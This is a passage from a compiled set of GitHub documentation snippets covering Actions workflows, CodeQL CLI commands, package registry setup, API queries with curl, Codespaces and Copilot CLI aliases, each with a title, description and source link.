application/vnd.github+json\"\n```\n\n----------------------------------------\n\nTITLE: Example configuration command and output\nDESCRIPTION: This snippet shows an example of running the `gh actions-importer configure` command and the expected output. It illustrates the prompts and inputs for configuring the GitHub Actions Importer.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ gh actions-importer configure\n✔ Which CI providers are you configuring?: Bamboo\nEnter the following values (leave empty to omit):\n✔ {% data variables.product.pat_generic_caps %} for GitHub: ***************\n✔ Base url of the GitHub instance: https://github.com\n✔ {% data variables.product.pat_generic_caps %} for Bamboo: ********************\n✔ Base url of the Bamboo instance: https://bamboo.example.com\nEnvironment variables successfully updated.\n```\n\n----------------------------------------\n\nTITLE: Vars Context Example\nDESCRIPTION: This JSON snippet shows an example of the `vars` context which contains configuration variables set at the organization, repository or environment levels.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"mascot\": \"Mona\"\n}\n```\n\n----------------------------------------\n\nTITLE: Publishing a CodeQL Pack\nDESCRIPTION: This command publishes a QL library pack to a package registry. It shows the basic structure of the command, including options for a dry run, setting the number of threads and RAM, specifying the pack location, and designating a directory to process.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/pack-publish.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql pack publish [--dry-run] [--threads=<num>] [--ram=<MB>] [--pack=<folder> | <package.tgz>] <options>... -- <dir>\n```\n\n----------------------------------------\n\nTITLE: Initiate Cluster Failover with ghe-cluster-failover (Shell)\nDESCRIPTION: This command initiates the failover process to the replica cluster. It configures the nodes in the replica cluster to respond to requests, promoting the replica to the new active cluster and decoupling it from the old active cluster. It should be run from the primary MySQL node in the replica cluster via SSH.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/initiating-a-failover-to-your-replica-cluster.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-cluster-failover\n```\n\n----------------------------------------\n\nTITLE: Mentioning Users and Teams in Markdown\nDESCRIPTION: Shows how to mention users or teams on GitHub using the '@' symbol followed by their username or team name. This triggers a notification for the mentioned user or team.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_13\n\nLANGUAGE: markdown\nCODE:\n```\n@github/support What do you think about these updates?\n```\n\n----------------------------------------\n\nTITLE: Example GitHub Actions Importer Configuration Output\nDESCRIPTION: This code snippet shows example output from the `gh actions-importer configure` command. It displays the prompts and user inputs for configuring the tool, including the selection of Travis CI as the provider, GitHub PAT, GitHub base URL, Travis CI API token, Travis CI base URL, and Travis CI organization name.  It demonstrates successful configuration by indicating that environment variables were updated.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ gh actions-importer configure\n✔ Which CI providers are you configuring?: Travis CI\nEnter the following values (leave empty to omit):\n✔ {% data variables.product.pat_generic_caps %} for GitHub: ***************\n✔ Base url of the GitHub instance: https://github.com\n✔ {% data variables.product.pat_generic_caps %} for Travis CI: ***************\n✔ Base url of the Travis CI instance: https://travis-ci.com\n✔ Travis CI organization name: actions-importer-labs\nEnvironment variables successfully updated.\n```\n\n----------------------------------------\n\nTITLE: Running All Queries in a Directory\nDESCRIPTION: This example shows how to execute all queries located in a directory recursively. It's important to avoid specifying the root of a core CodeQL query pack. It shows both using the pack name and path, and directly specifying the path to the directory. Requires a Python CodeQL database `<python-database>`. Output is saved as `python-analysis/python-results.sarif`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/analyzing-your-code-with-codeql-queries.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database analyze <python-database> codeql/python-queries:Functions --format=sarif-latest --output=python-analysis/python-results.sarif --download\n```\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database analyze <python-database> ../ql/python/ql/src/Functions/ --format=sarif-latest --output=python-analysis/python-results.sarif\n```\n\n----------------------------------------\n\nTITLE: Setting up JDK 11 with Adoptium for x64 using setup-java - YAML\nDESCRIPTION: This YAML snippet configures a GitHub Actions workflow to use version 11 of the JDK, provided by Adoptium, for the x64 architecture. It utilizes the `setup-java` action and sets the `java-version`, `distribution`, and `architecture` parameters to '11', 'temurin', and 'x64' respectively. The snippet assumes a checkout step has already been performed.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/java-jvm-architecture.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - uses: {% data reusables.actions.action-checkout %}\n  - name: Set up JDK 11 for x64\n    uses: {% data reusables.actions.action-setup-java %}\n    with:\n      java-version: '11'\n      distribution: 'temurin'\n      architecture: x64\n```\n\n----------------------------------------\n\nTITLE: Removing Invalid Keys in YAML\nDESCRIPTION: This snippet explains how to resolve the '`input` is not a permitted key' error. This error arises when the YAML file contains a key that is not recognized in the top level of the issue form schema.  The fix involves removing the unexpected key from the YAML file to adhere to the defined schema.  Refer to the documentation for allowed top-level keys.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\nhello: world\n...\n```\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\n...\n```\n\n----------------------------------------\n\nTITLE: Routing jobs using default labels in workflow YAML\nDESCRIPTION: This code snippet demonstrates how to route jobs to self-hosted runners using default labels for operating system and hardware architecture.  It specifies that the job should run on a self-hosted Linux runner with ARM64 architecture. The labels operate cumulatively.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/using-self-hosted-runners-in-a-workflow.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nruns-on: [self-hosted, linux, ARM64]\n```\n\n----------------------------------------\n\nTITLE: Fetching Weather Data from API (Initial Code)\nDESCRIPTION: This Python code fetches weather data from an external API using Flask and the `requests` library.  It simulates an API request and returns the weather data as JSON.  It doesn't include any rate limit handling.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/debugging-errors/handling-api-rate-limits.md#_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nfrom flask import Flask, request\nimport requests\n\napp = Flask(__name__)\n\nWEATHER_API_URL = \"https://api.example.com/weather\"\n\n@app.route('/get_weather', methods=['GET'])\ndef get_weather():\n    city = request.args.get('city')\n    # Simulate an API request to the external weather service\n    response = requests.get(WEATHER_API_URL, params={\"city\": city})\n    weather_data = response.json()\n\n    return weather_data\n```\n\n----------------------------------------\n\nTITLE: Defining GitHub Actions Workflow for Redelivering Failed Webhooks\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow to redeliver failed webhook deliveries. It schedules the workflow to run every 6 hours or when manually triggered. It checks out the repository content, sets up Node.js, installs dependencies, and runs a script to find and redeliver failed webhook deliveries using environment variables populated from GitHub secrets.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/automatically-redelivering-failed-deliveries-for-a-github-app-webhook.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n#\nname: Redeliver failed webhook deliveries\n\n# This workflow runs every 6 hours or when manually triggered.\non:\n  schedule:\n    - cron: '40 */6 * * *'\n  workflow_dispatch:\n\n# This workflow will use the built in `GITHUB_TOKEN` to check out the repository contents. This grants `GITHUB_TOKEN` permission to do that.\npermissions:\n  contents: read\n\n#\njobs:\n  redeliver-failed-deliveries:\n    name: Redeliver failed deliveries\n    runs-on: ubuntu-latest\n    steps:\n      # This workflow will run a script that is stored in the repository. This step checks out the repository contents so that the workflow can access the script.\n      - name: Check out repo content\n        uses: {% data reusables.actions.action-checkout %}\n\n      # This step sets up Node.js. The script that this workflow will run uses Node.js.\n      - name: Setup Node.js\n        uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '20.x'\n\n      # This step installs the octokit library. The script that this workflow will run uses the octokit library.\n      - name: Install dependencies\n        run: npm install octokit\n\n      # This step sets some environment variables, then runs a script to find and redeliver failed webhook deliveries.\n      # - Replace `YOUR_APP_ID_SECRET_NAME` with the name of the secret where you stored your app ID.\n      # - Replace `YOUR_PRIVATE_KEY_SECRET_NAME` with the name of the secret where you stored your private key.\n      # - Replace `YOUR_TOKEN_SECRET_NAME` with the name of the secret where you stored your {% data variables.product.pat_generic %}.\n      # - Replace `YOUR_LAST_REDELIVERY_VARIABLE_NAME` with the name that you want to use for a configuration variable that will be stored in the repository where this workflow is stored. The name can be any string that contains only alphanumeric characters and `_`, and does not start with `GITHUB_` or a number. For more information, see [AUTOTITLE](/actions/learn-github-actions/variables#defining-configuration-variables-for-multiple-workflows).\n      {% ifversion ghes %}# - Replace `YOUR_HOSTNAME` with the name of {% data variables.location.product_location %}.{% endif %}\n      - name: Run script\n        env:\n          APP_ID: {% raw %}${{ secrets.YOUR_APP_ID_SECRET_NAME }}{% endraw %}\n          PRIVATE_KEY: {% raw %}${{ secrets.YOUR_PRIVATE_KEY_SECRET_NAME }}{% endraw %}\n          TOKEN: {% raw %}${{ secrets.YOUR_TOKEN_SECRET_NAME }}{% endraw %}\n          LAST_REDELIVERY_VARIABLE_NAME: 'YOUR_LAST_REDELIVERY_VARIABLE_NAME'\n          {% ifversion ghes %}HOSTNAME: 'YOUR_HOSTNAME'{% endif %}\n          WORKFLOW_REPO: {% raw %}${{ github.event.repository.name }}{% endraw %}\n          WORKFLOW_REPO_OWNER: {% raw %}${{ github.repository_owner }}{% endraw %}\n        run: |\n          node .github/workflows/scripts/redeliver-failed-deliveries.mjs\n```\n\n----------------------------------------\n\nTITLE: Setting up Bash alias for GitHub Copilot\nDESCRIPTION: This command adds a line to the .bashrc file that evaluates the output of `gh copilot alias -- bash`. This creates aliases `ghcs` and `ghce` for `gh copilot suggest` and `gh copilot explain`, respectively. The alias allows GitHub Copilot CLI to execute commands.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/configuring-github-copilot-in-the-cli.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\necho 'eval \"$(gh copilot alias -- bash)\"' >> ~/.bashrc\n```\n\n----------------------------------------\n\nTITLE: Adding a Remote Repository with Git\nDESCRIPTION: This code snippet demonstrates how to add a remote repository to your local Git configuration using the `git remote add` command. The command associates a name (e.g., `origin`) with a remote URL, allowing you to easily refer to the remote repository in subsequent Git operations.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/about-remote-repositories.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit remote add origin <REMOTE_URL>\n```\n\n----------------------------------------\n\nTITLE: Docker Login with PAT\nDESCRIPTION: This command authenticates to the GitHub Container Registry using a Personal Access Token (PAT). The PAT is piped into the `docker login` command using `echo` and `--password-stdin`. Replace USERNAME with your GitHub username. Setting the CR_PAT environment variable with your PAT is also necessary.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/learn-github-packages/connecting-a-repository-to-a-package.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\n{% raw %}echo $CR_PAT | docker login {% endraw %}{% data reusables.package_registry.container-registry-hostname %}{% raw %} -u USERNAME --password-stdin\n> Login Succeeded{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Configuring .npmrc for Multiple Organizations (Shell)\nDESCRIPTION: This snippet configures the `.npmrc` file to allow installing packages from multiple organizations in GitHub Packages. Replace `NAMESPACE` with the organization name. It uses conditional logic based on the GitHub version (FPT/GHEC or others) to determine the correct registry URL.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-npm-registry.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\n@NAMESPACE:registry=https://{% ifversion fpt or ghec %}npm.pkg.github.com{% else %}npm.HOSTNAME{% endif %}\n@NAMESPACE:registry=https://{% ifversion fpt or ghec %}npm.pkg.github.com{% else %}npm.HOSTNAME{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Fetching all issues from a repository using paginate\nDESCRIPTION: This code snippet demonstrates how to use the `octokit.paginate` method to fetch all issues from a specified GitHub repository. It retrieves issues in batches of 100 until all pages are fetched and returns them as a single array.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nconst issueData = await octokit.paginate(\"GET /repos/{owner}/{repo}/issues\", {\n  owner: \"github\",\n  repo: \"docs\",\n  per_page: 100,\n  headers: {\n    \"x-github-api-version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Configuring RubyGems server with ProGet for Dependabot\nDESCRIPTION: This YAML snippet configures Dependabot to use a ProGet RubyGems server. It defines the registry type as `rubygems-server`, provides the URL of the server, and specifies the token for authentication. The token is expected to be stored as a secret in the environment.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_29\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  proget-gems-feed:\n    type: rubygems-server\n    url: https://proget.corp.local/rubygems/MyRubygemsFeed\n    token: ${{secrets.PROGET_APK_KEY}}\n```\n\n----------------------------------------\n\nTITLE: Wrapping Boolean Options in Quotes in YAML Issue Form\nDESCRIPTION: This example demonstrates the \"body[i]: `options` must not include booleans. Please wrap values such as 'yes', and 'true' in quotes\" error. It occurs when boolean-like words are present in the options and not wrapped in quotes. The corrected example wraps those values in quotes.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_19\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: dropdown\n  attributes:\n    label: Do you like pie?\n    options:\n      - Yes\n      - No\n      - Maybe\n```\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: dropdown\n  attributes:\n    label: Do you like pie?\n    options:\n      - \"Yes\"\n      - \"No\"\n      - Maybe\n```\n\n----------------------------------------\n\nTITLE: Specifying Directories to Scan in CodeQL - YAML\nDESCRIPTION: This YAML snippet demonstrates how to restrict CodeQL code scanning to files in specific directories using the `paths` array and how to exclude files in specific directories using the `paths-ignore` array. This is useful when analyzing codebases without building.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_19\n\nLANGUAGE: yaml\nCODE:\n```\npaths:\n  - src\npaths-ignore:\n  - src/node_modules\n  - '**/*.test.js'\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_PROJECT_PATH to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_PROJECT_PATH` to the GitHub Actions equivalent `${{ github.repository }}`. This represents the full path to the project in GitLab.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_41\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.repository }}\n```\n\n----------------------------------------\n\nTITLE: Example Tagging and Publishing (GHES)\nDESCRIPTION: This example demonstrates how to tag an existing image and push it to the GHES GitHub Packages registry. This is the subdomain isolation enabled example.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-docker-registry.md#_snippet_10\n\nLANGUAGE: Shell\nCODE:\n```\n$ docker images\n\n> REPOSITORY           TAG      IMAGE ID      CREATED      SIZE\n> monalisa             1.0      c75bebcdd211  4 weeks ago  1.11MB\n\n# Tag the image with OWNER/REPO/IMAGE_NAME\n$ docker tag c75bebcdd211 docker.HOSTNAME/octocat/octo-app/monalisa:1.0\n\n# Push the image to {% data variables.product.prodname_registry %}\n$ docker push docker.HOSTNAME/octocat/octo-app/monalisa:1.0\n```\n\n----------------------------------------\n\nTITLE: Querying Issues with cURL\nDESCRIPTION: This snippet demonstrates how to use `curl` to retrieve issues from a GitHub repository and redirect the response to a file named `data.json`.  It sends a GET request to the GitHub API endpoint, including headers for the media type and authorization. Replace `REPO-OWNER`, `REPO-NAME`, and `YOUR-TOKEN` with the actual values. The `per_page` parameter is set to 2.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_19\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request GET \\\n--url \"{% data variables.product.rest_url %}/repos/REPO-OWNER/REPO-NAME/issues?per_page=2\" \\\n--header \"Accept: application/vnd.github+json\" \\\n--header \"Authorization: Bearer YOUR-TOKEN\" > data.json\n```\n\n----------------------------------------\n\nTITLE: Complete devcontainer.json configuration example\nDESCRIPTION: A complete example of the `devcontainer.json` file, showing Java version configuration, feature installations (Maven, Ant), a post-create command, and VS Code extension installations.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-java-project-for-codespaces.md#_snippet_4\n\nLANGUAGE: jsonc\nCODE:\n```\n// For format details, see https://aka.ms/devcontainer.json. For config options, see the\n// README at: https://github.com/devcontainers/templates/tree/main/src/java\n{\n  \"name\": \"Java\",\n  // Or use a Dockerfile or Docker Compose file. More info: https://containers.dev/guide/dockerfile\n  \"image\": \"mcr.microsoft.com/devcontainers/java:0-17\",\n\n  \"features\": {\n    \"ghcr.io/devcontainers/features/java:1\": {\n      \"version\": \"none\",\n      \"installMaven\": \"true\",\n      \"installGradle\": \"false\"\n    },\n    \"ghcr.io/devcontainers-contrib/features/ant-sdkman:2\": {}\n  },\n\n  // Use 'forwardPorts' to make a list of ports inside the container available locally.\n  // \"forwardPorts\": [],\n\n  // Use 'postCreateCommand' to run commands after the container is created.\n  \"postCreateCommand\": \"echo \\\"This file was added by the postCreateCommand.\\\" > TEMP.md\",\n\n  // Configure tool-specific properties.\n  \"customizations\": {\n    // Configure properties specific to VS Code.\n    \"vscode\": {\n      // Add the IDs of extensions you want installed when the container is created.\n      \"extensions\": [\n        \"streetsidesoftware.code-spell-checker\",\n        \"vscjava.vscode-java-pack\"\n      ]\n    }\n  }\n\n  // Uncomment to connect as root instead. More info: https://aka.ms/dev-containers-non-root.\n  // \"remoteUser\": \"root\"\n}\n\n```\n\n----------------------------------------\n\nTITLE: Filtering Workflow Triggers by Event Type in YAML\nDESCRIPTION: This YAML snippet configures a GitHub Actions workflow to trigger only when a label is created or edited. It uses the `on` keyword with the `label` event and specifies the `types` as an array containing `created` and `edited`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflows/section-triggering-a-workflow-types.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  label:\n    types: [created, edited]\n```\n\n----------------------------------------\n\nTITLE: Querying Project Fields (Common) with curl\nDESCRIPTION: This snippet uses curl to query the first 20 fields of a GitHub project, retrieving only the ID and name using the `ProjectV2FieldCommon` object. The `PROJECT_ID` placeholder needs to be replaced with the actual project ID and `TOKEN` with a personal access token.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\ncurl --request POST \\\n  --url https://api.github.com/graphql \\\n  --header 'Authorization: Bearer TOKEN' \\\n  --data '{\"query\":\"query{ node(id: \\\"PROJECT_ID\\\") { ... on ProjectV2 { fields(first: 20) { nodes { ... on ProjectV2FieldCommon { id name }}}}}}\"}'\n```\n\n----------------------------------------\n\nTITLE: Shell command to execute CodeQL query tests\nDESCRIPTION: This shell command executes CodeQL query tests within a specified directory. The `--search-path` option allows to specify where to look for the query pack.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/testing-custom-queries.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ncodeql test run java/tests/EmptyThen\n```\n\nLANGUAGE: shell\nCODE:\n```\ncodeql test run --search-path=java java/tests/EmptyThen\n```\n\n----------------------------------------\n\nTITLE: Restarting a Codespace using GitHub CLI in VS Code\nDESCRIPTION: This snippet shows how to restart a codespace using the `gh codespace code` command, which will open the codespace in VS Code.  It requires the GitHub CLI to be installed and configured. When executed, it will prompt the user to select the codespace they wish to restart.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/stopping-and-starting-a-codespace.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace code\n```\n\n----------------------------------------\n\nTITLE: Using `matrix` context in GitHub Actions YAML\nDESCRIPTION: This YAML snippet illustrates how to utilize the `matrix` context to set the `runs-on` property and the Node.js version for each job in a matrix. The workflow defines a matrix with `os` and `node` keys.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_19\n\nLANGUAGE: yaml\nCODE:\n```\nname: Test matrix\non: push\n\njobs:\n  build:\n    runs-on: {% raw %}${{ matrix.os }}{% endraw %}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, windows-latest]\n        node: [14, 16]\n    steps:\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: {% raw %}${{ matrix.node }}{% endraw %}\n      - name: Output node version\n        run: node --version\n```\n\n----------------------------------------\n\nTITLE: SQL Query with GitHub Copilot Suggestion\nDESCRIPTION: This SQL query demonstrates how GitHub Copilot can suggest a join condition while writing a query in Azure Data Studio. The query selects columns from the `[Tag].[Scoreboard]` table and initiates an `INNER JOIN`, where GitHub Copilot is expected to provide a suggestion for the join condition. This relies on Copilot being installed and active within Azure Data Studio.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_11\n\nLANGUAGE: sql\nCODE:\n```\nSELECT [UserId], [Red], [Orange], [Yellow], [Green], [Blue], [Purple], [Rainbow]\nFROM [Tag].[Scoreboard]\nINNER JOIN\n```\n\n----------------------------------------\n\nTITLE: Exclude Repository Network from Cache\nDESCRIPTION: This command excludes a specific repository network from a cache location. Setting the replica count to zero prevents any copies of the network from being stored in the specified cache location (kansas).\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/caching-repositories/configuring-a-repository-cache.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nghe-spokesctl cache-policy set <owner/repository> 0 kansas\n```\n\n----------------------------------------\n\nTITLE: Forwarding ports using GitHub CLI\nDESCRIPTION: This command forwards a port from the codespace to your local machine using the GitHub CLI.  The `CODESPACE-PORT:LOCAL-PORT` argument specifies the mapping between the remote port in the codespace and the local port on your machine. You will be prompted to select a codespace if you have multiple.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/forwarding-ports-in-your-codespace.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace ports forward CODESPACE-PORT:LOCAL-PORT\n```\n\n----------------------------------------\n\nTITLE: Checking Background Upgrade Jobs with ghe-check-background-upgrade-jobs\nDESCRIPTION: This command is used to verify whether background upgrade jobs have completed after a GitHub Enterprise Server upgrade. It helps to ensure that the upgrade process has finished successfully and that all necessary post-upgrade tasks have been executed.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/troubleshooting-resource-allocation-problems.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-check-background-upgrade-jobs\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_SERVER_HOST to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_SERVER_HOST` to the GitHub Actions equivalent `${{ github.server_url }}`. Returns the GitHub server URL.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_47\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.server_url }}\n```\n\n----------------------------------------\n\nTITLE: Setting up PowerShell alias for GitHub Copilot\nDESCRIPTION: This script creates PowerShell aliases `ghcs` and `ghce` for `gh copilot suggest` and `gh copilot explain`, respectively. It writes the aliases to a separate profile file `gh-copilot.ps1` and then sources that file in the main PowerShell profile.  This allows GitHub Copilot CLI to execute commands.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/configuring-github-copilot-in-the-cli.md#_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\n$GH_COPILOT_PROFILE = Join-Path -Path $(Split-Path -Path $PROFILE -Parent) -ChildPath \"gh-copilot.ps1\"\ngh copilot alias -- pwsh | Out-File ( New-Item -Path $GH_COPILOT_PROFILE -Force )\necho \". \\\"$GH_COPILOT_PROFILE\\\"\" >> $PROFILE\n```\n\n----------------------------------------\n\nTITLE: Downloading CodeQL Database with GitHub CLI\nDESCRIPTION: This snippet demonstrates how to download a specific CodeQL database for a given language using the GitHub CLI (`gh api`) and the `/repos/<owner>/<repo>/code-scanning/codeql/databases/<language>` endpoint.  It specifies the `Accept: application/zip` header to receive the database as a zip file and redirects the output to a local file. Replace `<language>` with the desired programming language of the database.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/advanced-setup-of-the-codeql-cli.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh api /repos/<owner>/<repo>/code-scanning/codeql/databases/<language> -H 'Accept: application/zip' > path/to/local/database.zip\n```\n\n----------------------------------------\n\nTITLE: Running a GitHub CLI Extension\nDESCRIPTION: This snippet shows how to run a GitHub CLI extension after it has been installed.  The extension is run using `gh EXTENSION-NAME`, where `EXTENSION-NAME` is the repository name without the `gh-` prefix.  Consult the extension's README for usage details.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/using-github-cli-extensions.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh whoami\n```\n\n----------------------------------------\n\nTITLE: Resource Labels for Controller Pod - YAML\nDESCRIPTION: The following YAML snippet shows the labels applied to the controller pod in Actions Runner Controller. These labels can be used for filtering and troubleshooting. They include information about the component, instance, name, part of, and chart version. These can be used in `kubectl` commands for filtering logs or identifying resources.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\napp.kubernetes.io/component=controller-manager\napp.kubernetes.io/instance=<controller installation name>\napp.kubernetes.io/name=gha-runner-scale-set-controller\napp.kubernetes.io/part-of=gha-runner-scale-set-controller\napp.kubernetes.io/version=<chart version>\n```\n\n----------------------------------------\n\nTITLE: Dry Run Travis CI Migration with Source File\nDESCRIPTION: This command performs a dry run of the Travis CI migration using a specified source file instead of fetching from source control. It requires the output directory, Travis CI repository name, and the path to the Travis CI configuration file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer dry-run travis-ci --output-dir ./path/to/output/ --travis-ci-repository my-travis-ci-repository --source-file-path ./path/to/.travis.yml\n```\n\n----------------------------------------\n\nTITLE: GraphQL Error Response (Type Mismatch)\nDESCRIPTION: This JSON shows the error response received when attempting to add a comment with an incorrect data type (integer instead of string) for the `clientMutationId` field in a GraphQL mutation. It specifies the invalid value and expected type.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/migrating-from-rest-to-graphql.md#_snippet_8\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"data\": null,\n  \"errors\": [\n    {\n      \"message\": \"Argument 'input' on Field 'addComment' has an invalid value. Expected type 'AddCommentInput!'.\",\n      \"locations\": [\n        {\n          \"line\": 3,\n          \"column\": 3\n        }\n      ]\n    },\n    {\n      \"message\": \"Argument 'clientMutationId' on InputObject 'AddCommentInput' has an invalid value. Expected type 'String'.\",\n      \"locations\": [\n        {\n          \"line\": 3,\n          \"column\": 20\n        }\n      ]\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_PROJECT_ROOT_NAMESPACE to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_PROJECT_ROOT_NAMESPACE` to the GitHub Actions equivalent `${{ github.repository_owner }}`. Returns repo owner.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_42\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.repository_owner }}\n```\n\n----------------------------------------\n\nTITLE: Handling GitHub webhooks with Express.js\nDESCRIPTION: This Node.js code uses the Express framework to create a webhook endpoint. It listens for POST requests on the `/webhook` path, parses the JSON payload, checks the `x-github-event` header to determine the event type, and handles the `issues` and `ping` events. It requires the Express library to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/handling-webhook-deliveries.md#_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\n// You installed the `express` library earlier. For more information, see 